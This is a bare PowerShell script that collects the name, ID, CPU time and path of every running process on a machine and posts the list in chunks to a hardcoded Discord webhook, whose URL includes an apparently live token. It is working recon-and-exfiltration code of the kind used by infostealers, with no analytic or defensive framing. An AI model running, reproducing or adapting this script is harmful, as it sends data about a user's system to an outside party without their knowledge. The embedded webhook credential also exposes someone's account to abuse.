function Send-ProcessInfoToDiscord {
    $webhookUrl = "https://discord.com/api/webhooks/1322665023029645452/SHGcTVmDG5mpVZ1DDbYXpQyrWQJ25BYUK1ID55V0C8gC3syN6lpijpw_MsoDcrNy0V2I"

    $processes = Get-Process | Select-Object -Property Name, Id, CPU, Path

    $message = ""
    foreach ($process in $processes) {
        $message += "Process Name: $($process.Name), ID: $($process.Id), CPU: $($process.CPU), Path: $($process.Path)`n"
    }

    $maxLength = 2000
    $messageParts = [System.Collections.ArrayList]@()

    while ($message.Length -gt $maxLength) {
        $messageParts.Add($message.Substring(0, $maxLength))
        $message = $message.Substring($maxLength)
    }
    $messageParts.Add($message)

    foreach ($part in $messageParts) {
        $jsonPayload = @{
            content = $part
        } | ConvertTo-Json -Depth 2

        try {
            $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
        } catch {
            Write-Host "Error while sending process info to Discord: $_"
        }
    }
}

Send-ProcessInfoToDiscord
